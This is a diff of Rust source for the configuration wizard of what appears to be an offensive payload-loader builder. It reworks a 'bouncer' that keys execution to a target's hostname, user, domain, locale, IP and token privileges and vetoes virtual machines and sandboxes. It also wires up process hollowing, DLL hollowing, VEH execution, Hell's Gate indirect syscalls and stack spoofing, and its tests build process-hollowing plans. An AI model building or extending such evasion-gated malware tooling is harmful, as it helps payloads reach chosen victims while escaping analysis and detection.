@@ -1049,119 +1049,178 @@ impl Wizard<'_> {
         }
     }
 
-    /// The bouncer gate: how the checks combine, what to do on rejection, and
-    /// which checks to declare (each with its own value question).
+    /// The bouncer gate: what to do on rejection and which requirements to
+    /// declare (each with its own value question).
     fn ask_bouncer(
         &mut self,
         previous: Option<&bouncer::Params>,
         kind: OutputKind,
     ) -> Result<bouncer::Params> {
-        let mode = match self.ask_select(
-            "mode",
-            &[
-                ("all", "every declared check must pass"),
-                ("any", "at least one declared check must pass"),
-            ],
-            matches!(previous.map(|params| params.mode), Some(bouncer::Mode::Any)).into(),
-        )? {
-            0 => bouncer::Mode::All,
-            _ => bouncer::Mode::Any,
-        };
-        // `on_fail: exit` calls `std::process::exit`, which would kill the host
-        // process, so a DLL build only offers the silent rejection.
-        let on_fail = if kind == OutputKind::Dll {
-            bouncer::OnFail::Silent
+        // `action: exit` calls `std::process::exit`, which would kill the host
+        // process, so a DLL build only offers `abort`.
+        let action = if kind == OutputKind::Dll {
+            bouncer::RejectAction::Abort
         } else {
             match self.ask_select(
-                "on_fail",
+                "on_reject.action",
                 &[
-                    ("silent", "stop with exit code 0"),
+                    ("abort", "stop with exit code 0"),
                     ("exit", "stop with exit code 1"),
                 ],
                 matches!(
-                    previous.map(|params| params.on_fail),
-                    Some(bouncer::OnFail::Exit)
+                    previous.map(|params| params.on_reject.action),
+                    Some(bouncer::RejectAction::Exit)
                 )
                 .into(),
             )? {
-                0 => bouncer::OnFail::Silent,
-                _ => bouncer::OnFail::Exit,
+                0 => bouncer::RejectAction::Abort,
+                _ => bouncer::RejectAction::Exit,
             }
         };
 
-        let checks: [(&str, &str); 9] = [
+        let checks: [(&str, &str); 13] = [
             ("hostname", "required computer name (glob)"),
             ("username", "required user name (glob)"),
             ("domain", "required DNS domain (glob)"),
             ("language", "accepted BCP-47 locales"),
             ("keyboard", "accepted 4-digit layout codes"),
-            ("not_in_vm", "require no hypervisor (CPUID)"),
-            ("not_in_sandbox", "require the sandbox heuristic to pass"),
-            ("min_uptime_min", "minimum uptime, in minutes"),
-            ("min_ram_mb", "minimum physical memory, in MiB"),
+            ("ip", "accepted local IPv4/IPv6 CIDRs"),
+            ("elevation", "required token elevation"),
+            ("integrity", "accepted token integrity levels"),
+            ("privilege", "privilege enabled in the token"),
+            ("hypervisor", "require no hypervisor (CPUID)"),
+            ("sandbox", "require the sandbox heuristic to pass"),
+            ("uptime_min", "minimum uptime, in minutes"),
+            ("ram_mb", "minimum physical memory, in MiB"),
         ];
+        let previous_checks = PreviousChecks::from_params(previous);
         let default: Vec<usize> = checks
             .iter()
             .enumerate()
-            .filter(|(_, (name, _))| check_is_declared(name, previous))
+            .filter(|(_, (name, _))| previous_checks.is_declared(name))
             .map(|(index, _)| index)
             .collect();
         let selected = self.prompts.multi_select("checks", &checks, &default)?;
 
         let mut params = bouncer::Params {
-            mode,
-            on_fail,
+            on_reject: bouncer::OnReject {
+                action,
+                ..Default::default()
+            },
             ..Default::default()
         };
         for index in selected {
             match checks[index].0 {
                 "hostname" => {
-                    params.hostname = self.ask_optional_text(
-                        "hostname",
-                        previous.and_then(|params| params.hostname.as_deref()),
-                    )?
+                    if let Some(value) =
+                        self.ask_optional_text("hostname", previous_checks.hostname)?
+                    {
+                        params.require.push(bouncer::Requirement::Hostname(value));
+                    }
                 }
                 "username" => {
-                    params.username = self.ask_optional_text(
-                        "username",
-                        previous.and_then(|params| params.username.as_deref()),
-                    )?
+                    if let Some(value) =
+                        self.ask_optional_text("username", previous_checks.username)?
+                    {
+                        params.require.push(bouncer::Requirement::Username(value));
+                    }
                 }
                 "domain" => {
-                    params.domain = self.ask_optional_text(
-                        "domain",
-                        previous.and_then(|params| params.domain.as_deref()),
-                    )?
+                    if let Some(value) = self.ask_optional_text("domain", previous_checks.domain)? {
+                        params.require.push(bouncer::Requirement::Domain(value));
+                    }
                 }
                 "language" => {
-                    params.language = self.ask_list(
-                        "language",
-                        previous.map_or(&[], |params| params.language.as_slice()),
-                    )?
+                    let values = self.ask_list("language", previous_checks.locale)?;
+                    if !values.is_empty() {
+                        params.require.push(bouncer::Requirement::Locale(values));
+                    }
                 }
                 "keyboard" => {
-                    params.keyboard = self.ask_list(
-                        "keyboard",
-                        previous.map_or(&[], |params| params.keyboard.as_slice()),
-                    )?
+                    let values = self.ask_list("keyboard", previous_checks.keyboard)?;
+                    if !values.is_empty() {
+                        params.require.push(bouncer::Requirement::Keyboard(values));
+                    }
                 }
-                // Selecting either flag means "require it"; `false` and absent
-                // skip the check alike, so there is nothing more to ask.
-                "not_in_vm" => params.not_in_vm = Some(true),
-                "not_in_sandbox" => params.not_in_sandbox = Some(true),
-                "min_uptime_min" => {
-                    params.min_uptime_min = self.ask_optional_number(
-                        "min_uptime_min",
-                        u32::MAX as u64,
-                        previous.and_then(|params| params.min_uptime_min),
-                    )?
+                "ip" => {
+                    let values = self.ask_list("ip (CIDRs)", previous_checks.ip)?;
+                    if !values.is_empty() {
+                        params.require.push(bouncer::Requirement::Ip(values));
+                    }
                 }
-                "min_ram_mb" => {
-                    params.min_ram_mb = self.ask_optional_number(
-                        "min_ram_mb",
+                "elevation" => {
+                    let elevation = match self.ask_select(
+                        "elevation",
+                        &[
+                            ("elevated", "require an elevated token"),
+                            ("unelevated", "require an unelevated token"),
+                        ],
+                        matches!(
+                            previous_checks.elevation,
+                            Some(bouncer::Elevation::Unelevated)
+                        )
+                        .into(),
+                    )? {
+                        0 => bouncer::Elevation::Elevated,
+                        _ => bouncer::Elevation::Unelevated,
+                    };
+                    params
+                        .require
+                        .push(bouncer::Requirement::Elevation(elevation));
+                }
+                "integrity" => {
+                    const LEVELS: [bouncer::IntegrityLevel; 4] = [
+                        bouncer::IntegrityLevel::Low,
+                        bouncer::IntegrityLevel::Medium,
+                        bouncer::IntegrityLevel::High,
+                        bouncer::IntegrityLevel::System,
+                    ];
+                    let options: [(&str, &str); 4] = [
+                        ("low", "low integrity"),
+                        ("medium", "medium integrity"),
+                        ("high", "high integrity"),
+                        ("system", "SYSTEM integrity"),
+                    ];
+                    let default: Vec<usize> = LEVELS
+                        .iter()
+                        .enumerate()
+                        .filter(|(_, level)| previous_checks.integrity.contains(level))
+                        .map(|(index, _)| index)
+                        .collect();
+                    let selected = self.prompts.multi_select("integrity", &options, &default)?;
+                    let values: Vec<bouncer::IntegrityLevel> = selected
+                        .into_iter()
+                        .filter_map(|index| LEVELS.get(index).copied())
+                        .collect();
+                    if !values.is_empty() {
+                        params.require.push(bouncer::Requirement::Integrity(values));
+                    }
+                }
+                "privilege" => {
+                    if let Some(value) =
+                        self.ask_optional_text("privilege", previous_checks.privilege)?
+                    {
+                        params.require.push(bouncer::Requirement::Privilege(value));
+                    }
+                }
+                // The two heuristics are hard vetoes, not `require` entries.
+                "hypervisor" => params.anti_analysis.hypervisor = true,
+                "sandbox" => params.anti_analysis.sandbox = true,
+                "uptime_min" => {
+                    if let Some(value) = self.ask_optional_number(
+                        "uptime_min",
                         u32::MAX as u64,
-                        previous.and_then(|params| params.min_ram_mb),
-                    )?
+                        previous_checks.uptime_min,
+                    )? {
+                        params.require.push(bouncer::Requirement::UptimeMin(value));
+                    }
+                }
+                "ram_mb" => {
+                    if let Some(value) =
+                        self.ask_optional_number("ram_mb", u32::MAX as u64, previous_checks.ram_mb)?
+                    {
+                        params.require.push(bouncer::Requirement::RamMb(value));
+                    }
                 }
                 _ => {}
             }
@@ -1170,22 +1229,73 @@ impl Wizard<'_> {
     }
 }
 
-/// Whether a bouncer check field is declared (i.e. activates a check).
-fn check_is_declared(name: &str, previous: Option<&bouncer::Params>) -> bool {
-    let Some(params) = previous else {
-        return false;
-    };
-    match name {
-        "hostname" => params.hostname.is_some(),
-        "username" => params.username.is_some(),
-        "domain" => params.domain.is_some(),
-        "language" => !params.language.is_empty(),
-        "keyboard" => !params.keyboard.is_empty(),
-        "not_in_vm" => params.not_in_vm == Some(true),
-        "not_in_sandbox" => params.not_in_sandbox == Some(true),
-        "min_uptime_min" => params.min_uptime_min.is_some(),
-        "min_ram_mb" => params.min_ram_mb.is_some(),
-        _ => false,
+/// The bouncer requirements a previous run declared, for the wizard's defaults.
+#[derive(Default)]
+struct PreviousChecks<'a> {
+    hostname: Option<&'a str>,
+    username: Option<&'a str>,
+    domain: Option<&'a str>,
+    locale: &'a [String],
+    keyboard: &'a [String],
+    ip: &'a [String],
+    privilege: Option<&'a str>,
+    elevation: Option<bouncer::Elevation>,
+    integrity: &'a [bouncer::IntegrityLevel],
+    uptime_min: Option<u32>,
+    ram_mb: Option<u32>,
+    hypervisor: bool,
+    sandbox: bool,
+}
+
+impl<'a> PreviousChecks<'a> {
+    /// Scans the previous `require` list for the values the wizard asks about.
+    fn from_params(previous: Option<&'a bouncer::Params>) -> Self {
+        let mut checks = Self::default();
+        let Some(params) = previous else {
+            return checks;
+        };
+        checks.hypervisor = params.anti_analysis.hypervisor;
+        checks.sandbox = params.anti_analysis.sandbox;
+        for requirement in &params.require {
+            match requirement {
+                bouncer::Requirement::Hostname(value) => checks.hostname = Some(value),
+                bouncer::Requirement::Username(value) => checks.username = Some(value),
+                bouncer::Requirement::Domain(value) => checks.domain = Some(value),
+                bouncer::Requirement::Locale(values) => checks.locale = values,
+                bouncer::Requirement::Keyboard(values) => checks.keyboard = values,
+                bouncer::Requirement::Ip(values) => checks.ip = values,
+                bouncer::Requirement::Privilege(value) => checks.privilege = Some(value),
+                bouncer::Requirement::Elevation(value) => checks.elevation = Some(*value),
+                bouncer::Requirement::Integrity(values) => checks.integrity = values,
+                bouncer::Requirement::UptimeMin(value) => checks.uptime_min = Some(*value),
+                bouncer::Requirement::RamMb(value) => checks.ram_mb = Some(*value),
+                bouncer::Requirement::Process(_) => {}
+                // The wizard does not produce negations; a hand-edited `not`
+                // simply contributes no default.
+                bouncer::Requirement::Not(_) => {}
+            }
+        }
+        checks
+    }
+
+    /// Whether the check with this wizard key was declared previously.
+    fn is_declared(&self, name: &str) -> bool {
+        match name {
+            "hostname" => self.hostname.is_some(),
+            "username" => self.username.is_some(),
+            "domain" => self.domain.is_some(),
+            "language" => !self.locale.is_empty(),
+            "keyboard" => !self.keyboard.is_empty(),
+            "ip" => !self.ip.is_empty(),
+            "elevation" => self.elevation.is_some(),
+            "integrity" => !self.integrity.is_empty(),
+            "privilege" => self.privilege.is_some(),
+            "hypervisor" => self.hypervisor,
+            "sandbox" => self.sandbox,
+            "uptime_min" => self.uptime_min.is_some(),
+            "ram_mb" => self.ram_mb.is_some(),
+            _ => false,
+        }
     }
 }
 
@@ -1355,6 +1465,7 @@ fn assemble(payload: &Path, answers: &Answers) -> Plan {
                 syscalls: (answers.syscalls_mode == "indirect").then(|| YamlSyscallsPlan {
                     mode: answers.syscalls_mode.clone(),
                     resolver: "hells_gate".to_string(),
+                    stack_spoofing: None,
                 }),
                 // API resolution is an advanced loader setting; edit it in the YAML.
                 api_resolution: None,
@@ -1410,7 +1521,8 @@ fn default_format(technique: &TechniqueKind) -> PayloadFormat {
         | TechniqueKind::EarlyBird { .. }
         | TechniqueKind::ThreadHijacking { .. }
         | TechniqueKind::Fibers { .. }
-        | TechniqueKind::DllHollowing { .. } => PayloadFormat::Shellcode,
+        | TechniqueKind::DllHollowing { .. }
+        | TechniqueKind::VehExecution { .. } => PayloadFormat::Shellcode,
         _ => PayloadFormat::Pe,
     }
 }
@@ -1785,9 +1897,8 @@ mod tests {
             "process_hollowing", // execution
             "",                  // target -> default
             "1",                 // preparation: bouncer
-            "",                  // bouncer mode -> all
-            "",                  // bouncer on_fail -> silent
-            "1,6",               // checks: hostname + not_in_vm
+            "",                  // bouncer on_reject.action -> abort
+            "1,10",              // checks: hostname + not_in_vm
             "WORKSTATION-*",     // hostname
             "",                  // add another runtime step? -> no
             "",                  // strings -> xor
@@ -1812,10 +1923,12 @@ mod tests {
         let TechniqueKind::Bouncer { params } = &plan.runtime[0].technique else {
             panic!("expected a bouncer first, got {:?}", plan.runtime[0]);
         };
-        assert_eq!(params.mode, bouncer::Mode::All);
-        assert_eq!(params.on_fail, bouncer::OnFail::Silent);
-        assert_eq!(params.hostname.as_deref(), Some("WORKSTATION-*"));
-        assert_eq!(params.not_in_vm, Some(true));
+        assert_eq!(params.on_reject.action, bouncer::RejectAction::Abort);
+        assert_eq!(
+            params.require,
+            vec![bouncer::Requirement::Hostname("WORKSTATION-*".to_string())]
+        );
+        assert!(params.anti_analysis.hypervisor);
 
         let TechniqueKind::ProcessHollowing { params } = &plan.runtime[1].technique else {
             panic!(
@@ -1969,8 +2082,8 @@ mod tests {
         );
     }
 
-    /// A DLL build never offers `bouncer`'s `on_fail: exit` (which would kill the
-    /// host process), so the bouncer question flow is one prompt shorter.
+    /// A DLL build never offers `bouncer`'s exiting rejection (which would kill
+    /// the host process), so the bouncer question flow is one prompt shorter.
     #[test]
     fn a_dll_build_never_offers_the_process_killing_bouncer_rejection() {
         use crate::techniques::bouncer;
@@ -1984,7 +2097,6 @@ mod tests {
             "dll",  // output kind
             "",     // execution -> reflective_loading
             "1",    // preparation: bouncer
-            "",     // bouncer mode -> all
             "1",    // checks: hostname
             "PC-*", // hostname
             "",     // strings
@@ -2003,11 +2115,13 @@ mod tests {
         let TechniqueKind::Bouncer { params } = &plan.runtime[0].technique else {
             panic!("expected a bouncer first, got {:?}", plan.runtime[0]);
         };
-        assert_eq!(params.mode, bouncer::Mode::All);
-        assert_eq!(params.hostname.as_deref(), Some("PC-*"));
         assert_eq!(
-            params.on_fail,
-            bouncer::OnFail::Silent,
+            params.require,
+            vec![bouncer::Requirement::Hostname("PC-*".to_string())]
+        );
+        assert_eq!(
+            params.on_reject.action,
+            bouncer::RejectAction::Abort,
             "a DLL build must never select the exiting rejection"
         );
         assert_eq!(plan.build.output.kind, OutputKind::Dll);
